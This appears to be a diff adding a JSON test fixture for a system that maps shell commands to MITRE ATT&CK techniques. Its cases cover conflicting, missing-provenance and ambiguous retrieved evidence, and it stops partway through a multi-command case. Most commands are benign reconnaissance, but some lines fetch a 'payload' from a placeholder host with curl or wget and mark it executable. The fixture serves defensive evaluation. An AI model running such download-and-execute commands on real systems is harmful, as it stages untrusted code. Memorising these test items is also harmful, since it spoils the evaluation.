@@ -1,0 +1,377 @@
+{
+  "cases": [
+    {
+      "case_id": "conflicting-001",
+      "claimed_behavior": "observed_command_behavior",
+      "command": "uname -a",
+      "preceding_commands": [],
+      "retrieved_candidates": [
+        {
+          "content": "# System Information Discovery (T1082)\n\nAn adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use this information to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. This behavior is distinct from [Local Storage Discovery](https://attack.mitre.org/techniques/T1680) which is an adversary's discovery of local drive, disks and/or volumes.\n\nTools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. Adversaries may leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather detailed system information (e.g. <code>show version</code>).(Citation: US-CERT-TA18-106A) On ESXi servers, threat actors may gather system information from various esxcli utilities, such as `system hostname get` and `system version get`.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(Citation: Varonis)\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)\n\n[System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques) \n\n**Platforms:** ESXi, IaaS, Linux, macOS, Network Devices, Windows\n\n**Tactics:** discovery\n\n**Recommended mitigations:** See ATT&CK website for details.",
+          "doc_id": "DONV2-T1082",
+          "provenance_status": "VALID",
+          "source": "https://attack.mitre.org/techniques/T1082",
+          "source_version": "local-mitre-corpus-2026-10-14",
+          "title": "MITRE Technique: System Information Discovery (T1082)"
+        },
+        {
+          "content": "This contradicts the observed behavior described by DONV2-T1082.",
+          "doc_id": "DONV2-T1082-CONTRADICTORY",
+          "provenance_status": "VALID",
+          "source": "https://attack.mitre.org/techniques/T1082",
+          "source_version": "local-mitre-corpus-2026-10-14",
+          "title": "MITRE Technique: System Information Discovery (T1082)"
+        }
+      ]
+    },
+    {
+      "case_id": "conflicting-002",
+      "claimed_behavior": "observed_command_behavior",
+      "command": "ls -la",
+      "preceding_commands": [],
+      "retrieved_candidates": [
+        {
+          "content": "# File and Directory Discovery (T1083)\n\nAdversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).(Citation: US-CERT-TA18-106A)\n\nSome files and directories may require elevated or specific user permissions to access.\n\n**Platforms:** ESXi, Linux, macOS, Network Devices, Windows\n\n**Tactics:** discovery\n\n**Recommended mitigations:** See ATT&CK website for details.",
+          "doc_id": "DONV2-T1083",
+          "provenance_status": "VALID",
+          "source": "https://attack.mitre.org/techniques/T1083",
+          "source_version": "local-mitre-corpus-2026-10-14",
+          "title": "MITRE Technique: File and Directory Discovery (T1083)"
+        },
+        {
+          "content": "This contradicts the observed behavior described by DONV2-T1083.",
+          "doc_id": "DONV2-T1083-CONTRADICTORY",
+          "provenance_status": "VALID",
+          "source": "https://attack.mitre.org/techniques/T1083",
+          "source_version": "local-mitre-corpus-2026-10-14",
+          "title": "MITRE Technique: File and Directory Discovery (T1083)"
+        }
+      ]
+    },
+    {
+      "case_id": "conflicting-003",
+      "claimed_behavior": "observed_command_behavior",
+      "command": "id",
+      "preceding_commands": [],
+      "retrieved_candidates": [
+        {
+          "content": "# Local Account (T1087.001)\n\nAdversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.\n\nCommands such as <code>net user</code> and <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility and <code>id</code> and <code>groups</code> on macOS and Linux can list local users and groups.(Citation: Mandiant APT1)(Citation: id man page)(Citation: groups man page) On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file. On macOS, the <code>dscl . list /Users</code> command can be used to enumerate local accounts. On ESXi servers, the `esxcli system account list` command can list local user accounts.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)\n\n**Platforms:** ESXi, Linux, macOS, Windows\n\n**Tactics:** discovery\n\n**Recommended mitigations:** See ATT&CK website for details.",
+          "doc_id": "DONV2-T1087.001",
+          "provenance_status": "VALID",
+          "source": "https://attack.mitre.org/techniques/T1087/001",
+          "source_version": "local-mitre-corpus-2026-10-14",
+          "title": "MITRE Technique: Local Account (T1087.001)"
+        },
+        {
+          "content": "This contradicts the observed behavior described by DONV2-T1087.001.",
+          "doc_id": "DONV2-T1087.001-CONTRADICTORY",
+          "provenance_status": "VALID",
+          "source": "https://attack.mitre.org/techniques/T1087/001",
+          "source_version": "local-mitre-corpus-2026-10-14",
+          "title": "MITRE Technique: Local Account (T1087.001)"
+        }
+      ]
+    },
+    {
+      "case_id": "conflicting-004",
+      "claimed_behavior": "observed_command_behavior",
+      "command": "crontab -l",
+      "preceding_commands": [],
+      "retrieved_candidates": [
+        {
+          "content": "# Cron (T1053.003)\n\nAdversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code.(Citation: 20 macOS Common Tools and Techniques) The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems.  The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths.\n\nAn adversary may use <code>cron</code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). In ESXi environments, cron jobs must be created directly via the crontab file (e.g., `/var/spool/cron/crontabs/root`).(Citation: CloudSEK ESXiArgs 2023)\n\n**Platforms:** Linux, macOS, ESXi\n\n**Tactics:** execution, persistence, privilege-escalation\n\n**Recommended mitigations:** See ATT&CK website for details.",
+          "doc_id": "DONV2-T1053.003",
+          "provenance_status": "VALID",
+          "source": "https://attack.mitre.org/techniques/T1053/003",
+          "source_version": "local-mitre-corpus-2026-10-14",
+          "title": "MITRE Technique: Cron (T1053.003)"
+        },
+        {
+          "content": "This contradicts the observed behavior described by DONV2-T1053.003.",
+          "doc_id": "DONV2-T1053.003-CONTRADICTORY",
+          "provenance_status": "VALID",
+          "source": "https://attack.mitre.org/techniques/T1053/003",
+          "source_version": "local-mitre-corpus-2026-10-14",
+          "title": "MITRE Technique: Cron (T1053.003)"
+        }
+      ]
+    },
+    {
+      "case_id": "conflicting-005",
+      "claimed_behavior": "observed_command_behavior",
+      "command": "ssh admin@example.invalid",
+      "preceding_commands": [],
+      "retrieved_candidates": [
+        {
+          "content": "# SSH (T1021.004)\n\nAdversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.\n\nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. On ESXi, SSH can be enabled either directly on the host (e.g., via `vim-cmd hostsvc/enable_ssh`) or via vCenter.(Citation: Sygnia ESXi Ransomware 2025)(Citation: TrendMicro ESXI Ransomware)(Citation: Sygnia Abyss Locker 2025) The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user (i.e., [SSH Authorized Keys](https://attack.mitre.org/techniques/T1098/004)).\n\n**Platforms:** ESXi, Linux, macOS\n\n**Tactics:** lateral-movement\n\n**Recommended mitigations:** See ATT&CK website for details.",
+          "doc_id": "DONV2-T1021.004",
+          "provenance_status": "VALID",
+          "source": "https://attack.mitre.org/techniques/T1021/004",
+          "source_version": "local-mitre-corpus-2026-10-14",
+          "title": "MITRE Technique: SSH (T1021.004)"
+        },
+        {
+          "content": "This contradicts the observed behavior described by DONV2-T1021.004.",
+          "doc_id": "DONV2-T1021.004-CONTRADICTORY",
+          "provenance_status": "VALID",
+          "source": "https://attack.mitre.org/techniques/T1021/004",
+          "source_version": "local-mitre-corpus-2026-10-14",
+          "title": "MITRE Technique: SSH (T1021.004)"
+        }
+      ]
+    },
+    {
+      "case_id": "conflicting-006",
+      "claimed_behavior": "observed_command_behavior",
+      "command": "curl http://example.invalid/payload",
+      "preceding_commands": [],
+      "retrieved_candidates": [
+        {
+          "content": "# Ingress Tool Transfer (T1105)\n\nAdversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)  A number of these tools, such as `wget`, `curl`, and `scp`, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via `certutil -hashfile`).(Citation: Google Cloud Threat Intelligence COSCMICENERGY 2023)\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution](https://attack.mitre.org/techniques/T1204) (typically after interacting with [Phishing](https://attack.mitre.org/techniques/T1566) lures).(Citation: T1105: Trellix_search-ms)\n\nFiles can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016) In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.(Citation: Dropbox Malware Sync)\n\n**Platforms:** ESXi, Linux, macOS, Network Devices, Windows\n\n**Tactics:** command-and-control\n\n**Recommended mitigations:** See ATT&CK website for details.",
+          "doc_id": "DONV2-T1105",
+          "provenance_status": "VALID",
+          "source": "https://attack.mitre.org/techniques/T1105",
+          "source_version": "local-mitre-corpus-2026-10-14",
+          "title": "MITRE Technique: Ingress Tool Transfer (T1105)"
+        },
+        {
+          "content": "This contradicts the observed behavior described by DONV2-T1105.",
+          "doc_id": "DONV2-T1105-CONTRADICTORY",
+          "provenance_status": "VALID",
+          "source": "https://attack.mitre.org/techniques/T1105",
+          "source_version": "local-mitre-corpus-2026-10-14",
+          "title": "MITRE Technique: Ingress Tool Transfer (T1105)"
+        }
+      ]
+    },
+    {
+      "case_id": "missing-provenance-001",
+      "claimed_behavior": "provenance-required behavior",
+      "command": "uname -a",
+      "preceding_commands": [],
+      "retrieved_candidates": [
+        {
+          "content": "# System Information Discovery (T1082)\n\nAn adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use this information to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. This behavior is distinct from [Local Storage Discovery](https://attack.mitre.org/techniques/T1680) which is an adversary's discovery of local drive, disks and/or volumes.\n\nTools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. Adversaries may leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather detailed system information (e.g. <code>show version</code>).(Citation: US-CERT-TA18-106A) On ESXi servers, threat actors may gather system information from various esxcli utilities, such as `system hostname get` and `system version get`.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(Citation: Varonis)\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)\n\n[System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques) \n\n**Platforms:** ESXi, IaaS, Linux, macOS, Network Devices, Windows\n\n**Tactics:** discovery\n\n**Recommended mitigations:** See ATT&CK website for details.",
+          "doc_id": "DONV2-T1082",
+          "provenance_status": "UNKNOWN",
+          "source": "",
+          "source_version": "local-mitre-corpus-2026-10-14",
+          "title": "MITRE Technique: System Information Discovery (T1082)"
+        }
+      ]
+    },
+    {
+      "case_id": "missing-provenance-002",
+      "claimed_behavior": "provenance-required behavior",
+      "command": "hostname",
+      "preceding_commands": [],
+      "retrieved_candidates": [
+        {
+          "content": "# System Information Discovery (T1082)\n\nAn adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use this information to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. This behavior is distinct from [Local Storage Discovery](https://attack.mitre.org/techniques/T1680) which is an adversary's discovery of local drive, disks and/or volumes.\n\nTools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. Adversaries may leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather detailed system information (e.g. <code>show version</code>).(Citation: US-CERT-TA18-106A) On ESXi servers, threat actors may gather system information from various esxcli utilities, such as `system hostname get` and `system version get`.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(Citation: Varonis)\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)\n\n[System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques) \n\n**Platforms:** ESXi, IaaS, Linux, macOS, Network Devices, Windows\n\n**Tactics:** discovery\n\n**Recommended mitigations:** See ATT&CK website for details.",
+          "doc_id": "DONV2-T1082",
+          "provenance_status": "UNKNOWN",
+          "source": "",
+          "source_version": "local-mitre-corpus-2026-10-14",
+          "title": "MITRE Technique: System Information Discovery (T1082)"
+        }
+      ]
+    },
+    {
+      "case_id": "missing-provenance-003",
+      "claimed_behavior": "provenance-required behavior",
+      "command": "ls -la",
+      "preceding_commands": [],
+      "retrieved_candidates": [
+        {
+          "content": "# File and Directory Discovery (T1083)\n\nAdversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).(Citation: US-CERT-TA18-106A)\n\nSome files and directories may require elevated or specific user permissions to access.\n\n**Platforms:** ESXi, Linux, macOS, Network Devices, Windows\n\n**Tactics:** discovery\n\n**Recommended mitigations:** See ATT&CK website for details.",
+          "doc_id": "DONV2-T1083",
+          "provenance_status": "UNKNOWN",
+          "source": "",
+          "source_version": "local-mitre-corpus-2026-10-14",
+          "title": "MITRE Technique: File and Directory Discovery (T1083)"
+        }
+      ]
+    },
+    {
+      "case_id": "missing-provenance-004",
+      "claimed_behavior": "provenance-required behavior",
+      "command": "find /tmp -type f",
+      "preceding_commands": [],
+      "retrieved_candidates": [
+        {
+          "content": "# File and Directory Discovery (T1083)\n\nAdversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).(Citation: US-CERT-TA18-106A)\n\nSome files and directories may require elevated or specific user permissions to access.\n\n**Platforms:** ESXi, Linux, macOS, Network Devices, Windows\n\n**Tactics:** discovery\n\n**Recommended mitigations:** See ATT&CK website for details.",
+          "doc_id": "DONV2-T1083",
+          "provenance_status": "UNKNOWN",
+          "source": "",
+          "source_version": "local-mitre-corpus-2026-10-14",
+          "title": "MITRE Technique: File and Directory Discovery (T1083)"
+        }
+      ]
+    },
+    {
+      "case_id": "missing-provenance-005",
+      "claimed_behavior": "provenance-required behavior",
+      "command": "id",
+      "preceding_commands": [],
+      "retrieved_candidates": [
+        {
+          "content": "# Local Account (T1087.001)\n\nAdversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.\n\nCommands such as <code>net user</code> and <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility and <code>id</code> and <code>groups</code> on macOS and Linux can list local users and groups.(Citation: Mandiant APT1)(Citation: id man page)(Citation: groups man page) On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file. On macOS, the <code>dscl . list /Users</code> command can be used to enumerate local accounts. On ESXi servers, the `esxcli system account list` command can list local user accounts.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)\n\n**Platforms:** ESXi, Linux, macOS, Windows\n\n**Tactics:** discovery\n\n**Recommended mitigations:** See ATT&CK website for details.",
+          "doc_id": "DONV2-T1087.001",
+          "provenance_status": "UNKNOWN",
+          "source": "",
+          "source_version": "local-mitre-corpus-2026-10-14",
+          "title": "MITRE Technique: Local Account (T1087.001)"
+        }
+      ]
+    },
+    {
+      "case_id": "missing-provenance-006",
+      "claimed_behavior": "provenance-required behavior",
+      "command": "whoami",
+      "preceding_commands": [],
+      "retrieved_candidates": [
+        {
+          "content": "# Local Account (T1087.001)\n\nAdversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.\n\nCommands such as <code>net user</code> and <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility and <code>id</code> and <code>groups</code> on macOS and Linux can list local users and groups.(Citation: Mandiant APT1)(Citation: id man page)(Citation: groups man page) On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file. On macOS, the <code>dscl . list /Users</code> command can be used to enumerate local accounts. On ESXi servers, the `esxcli system account list` command can list local user accounts.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)\n\n**Platforms:** ESXi, Linux, macOS, Windows\n\n**Tactics:** discovery\n\n**Recommended mitigations:** See ATT&CK website for details.",
+          "doc_id": "DONV2-T1087.001",
+          "provenance_status": "UNKNOWN",
+          "source": "",
+          "source_version": "local-mitre-corpus-2026-10-14",
+          "title": "MITRE Technique: Local Account (T1087.001)"
+        }
+      ]
+    },
+    {
+      "case_id": "ambiguous-001",
+      "claimed_behavior": "observed_command_behavior",
+      "command": "uname -a '",
+      "preceding_commands": [],
+      "retrieved_candidates": [
+        {
+          "content": "# System Information Discovery (T1082)\n\nAn adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use this information to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. This behavior is distinct from [Local Storage Discovery](https://attack.mitre.org/techniques/T1680) which is an adversary's discovery of local drive, disks and/or volumes.\n\nTools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. Adversaries may leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather detailed system information (e.g. <code>show version</code>).(Citation: US-CERT-TA18-106A) On ESXi servers, threat actors may gather system information from various esxcli utilities, such as `system hostname get` and `system version get`.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(Citation: Varonis)\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)\n\n[System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques) \n\n**Platforms:** ESXi, IaaS, Linux, macOS, Network Devices, Windows\n\n**Tactics:** discovery\n\n**Recommended mitigations:** See ATT&CK website for details.",
+          "doc_id": "DONV2-T1082",
+          "provenance_status": "VALID",
+          "source": "https://attack.mitre.org/techniques/T1082",
+          "source_version": "local-mitre-corpus-2026-10-14",
+          "title": "MITRE Technique: System Information Discovery (T1082)"
+        }
+      ]
+    },
+    {
+      "case_id": "ambiguous-002",
+      "claimed_behavior": "observed_command_behavior",
+      "command": "hostname '",
+      "preceding_commands": [],
+      "retrieved_candidates": [
+        {
+          "content": "# System Information Discovery (T1082)\n\nAn adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use this information to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. This behavior is distinct from [Local Storage Discovery](https://attack.mitre.org/techniques/T1680) which is an adversary's discovery of local drive, disks and/or volumes.\n\nTools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. Adversaries may leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather detailed system information (e.g. <code>show version</code>).(Citation: US-CERT-TA18-106A) On ESXi servers, threat actors may gather system information from various esxcli utilities, such as `system hostname get` and `system version get`.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(Citation: Varonis)\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)\n\n[System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques) \n\n**Platforms:** ESXi, IaaS, Linux, macOS, Network Devices, Windows\n\n**Tactics:** discovery\n\n**Recommended mitigations:** See ATT&CK website for details.",
+          "doc_id": "DONV2-T1082",
+          "provenance_status": "VALID",
+          "source": "https://attack.mitre.org/techniques/T1082",
+          "source_version": "local-mitre-corpus-2026-10-14",
+          "title": "MITRE Technique: System Information Discovery (T1082)"
+        }
+      ]
+    },
+    {
+      "case_id": "ambiguous-003",
+      "claimed_behavior": "observed_command_behavior",
+      "command": "ls -la '",
+      "preceding_commands": [],
+      "retrieved_candidates": [
+        {
+          "content": "# File and Directory Discovery (T1083)\n\nAdversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).(Citation: US-CERT-TA18-106A)\n\nSome files and directories may require elevated or specific user permissions to access.\n\n**Platforms:** ESXi, Linux, macOS, Network Devices, Windows\n\n**Tactics:** discovery\n\n**Recommended mitigations:** See ATT&CK website for details.",
+          "doc_id": "DONV2-T1083",
+          "provenance_status": "VALID",
+          "source": "https://attack.mitre.org/techniques/T1083",
+          "source_version": "local-mitre-corpus-2026-10-14",
+          "title": "MITRE Technique: File and Directory Discovery (T1083)"
+        }
+      ]
+    },
+    {
+      "case_id": "ambiguous-004",
+      "claimed_behavior": "observed_command_behavior",
+      "command": "find /tmp -type f '",
+      "preceding_commands": [],
+      "retrieved_candidates": [
+        {
+          "content": "# File and Directory Discovery (T1083)\n\nAdversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).(Citation: US-CERT-TA18-106A)\n\nSome files and directories may require elevated or specific user permissions to access.\n\n**Platforms:** ESXi, Linux, macOS, Network Devices, Windows\n\n**Tactics:** discovery\n\n**Recommended mitigations:** See ATT&CK website for details.",
+          "doc_id": "DONV2-T1083",
+          "provenance_status": "VALID",
+          "source": "https://attack.mitre.org/techniques/T1083",
+          "source_version": "local-mitre-corpus-2026-10-14",
+          "title": "MITRE Technique: File and Directory Discovery (T1083)"
+        }
+      ]
+    },
+    {
+      "case_id": "ambiguous-005",
+      "claimed_behavior": "observed_command_behavior",
+      "command": "id '",
+      "preceding_commands": [],
+      "retrieved_candidates": [
+        {
+          "content": "# Local Account (T1087.001)\n\nAdversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.\n\nCommands such as <code>net user</code> and <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility and <code>id</code> and <code>groups</code> on macOS and Linux can list local users and groups.(Citation: Mandiant APT1)(Citation: id man page)(Citation: groups man page) On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file. On macOS, the <code>dscl . list /Users</code> command can be used to enumerate local accounts. On ESXi servers, the `esxcli system account list` command can list local user accounts.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)\n\n**Platforms:** ESXi, Linux, macOS, Windows\n\n**Tactics:** discovery\n\n**Recommended mitigations:** See ATT&CK website for details.",
+          "doc_id": "DONV2-T1087.001",
+          "provenance_status": "VALID",
+          "source": "https://attack.mitre.org/techniques/T1087/001",
+          "source_version": "local-mitre-corpus-2026-10-14",
+          "title": "MITRE Technique: Local Account (T1087.001)"
+        }
+      ]
+    },
+    {
+      "case_id": "ambiguous-006",
+      "claimed_behavior": "observed_command_behavior",
+      "command": "whoami '",
+      "preceding_commands": [],
+      "retrieved_candidates": [
+        {
+          "content": "# Local Account (T1087.001)\n\nAdversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.\n\nCommands such as <code>net user</code> and <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility and <code>id</code> and <code>groups</code> on macOS and Linux can list local users and groups.(Citation: Mandiant APT1)(Citation: id man page)(Citation: groups man page) On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file. On macOS, the <code>dscl . list /Users</code> command can be used to enumerate local accounts. On ESXi servers, the `esxcli system account list` command can list local user accounts.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)\n\n**Platforms:** ESXi, Linux, macOS, Windows\n\n**Tactics:** discovery\n\n**Recommended mitigations:** See ATT&CK website for details.",
+          "doc_id": "DONV2-T1087.001",
+          "provenance_status": "VALID",
+          "source": "https://attack.mitre.org/techniques/T1087/001",
+          "source_version": "local-mitre-corpus-2026-10-14",
+          "title": "MITRE Technique: Local Account (T1087.001)"
+        }
+      ]
+    },
+    {
+      "case_id": "multi-command-001",
+      "claimed_behavior": "observed_command_behavior",
+      "command": "chmod +x /tmp/x",
+      "preceding_commands": [
+        "wget http://example.invalid/x -O /tmp/x"
+      ],
